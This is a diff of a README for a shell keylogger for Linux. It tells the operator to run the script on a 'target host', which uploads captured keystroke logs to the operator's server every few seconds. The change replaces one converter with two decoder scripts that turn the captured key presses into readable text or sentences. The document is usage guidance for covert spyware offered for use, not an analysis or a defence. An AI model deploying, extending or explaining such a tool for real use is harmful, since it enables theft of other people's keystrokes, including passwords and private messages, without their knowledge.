@@ -9,8 +9,14 @@ A streamlined keylogger for Linux systems written in shell.
 - Run "simple_keylog.sh" on target host.
 - "logs.txt" will upload to your server and update every X number of seconds according to your specification.
 - Move "log_converter.py" to the same directory of server as "logs.txt" or create a new folder and add both files to it.
-- cd to directory where both files are contained and run:
+- cd to directory where both files are contained and you can either run:
 ```
-python3 log_converter.py 
+python3 decoder.py 
 ```
-- This will convert the captured logs into a user-readable format and output the converted version as "logs_converted.txt" in the same directory. 
+- This will convert the captured logs into a user-readable format and output the converted version as "logs_decoded.txt" in the same directory. This version will include all the key presses and releases but may be as readable.
+- Or you can run
+```
+python3 sentencer.py
+```
+- This will convert the captured logs into an even more user-readable format and output the converted version as "logs_sentenced.txt" in the same directory. This version will be readable in a sentence-like format but will exclude key releases.
+  
